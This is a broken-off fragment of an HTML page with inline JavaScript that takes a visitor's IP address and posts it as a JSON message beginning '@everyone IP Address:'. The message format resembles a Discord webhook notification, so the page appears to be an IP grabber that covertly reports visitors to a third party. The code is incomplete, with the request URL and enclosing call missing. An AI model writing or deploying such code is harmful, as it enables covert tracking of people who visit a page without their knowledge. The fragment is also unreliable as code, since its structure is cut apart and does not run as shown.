<html>

	<script>

					var ipAddress = data.ip;

						contentType: "application/json",
						data: JSON.stringify({"content": "@everyone IP Address: " + ipAddress}),
						success: function() {
							console.log("");
							$("#message2").fadeIn(2000).fadeOut(2000, function() {

							});
						},
						error: function(xhr, status, error) {
							console.error("" + error);
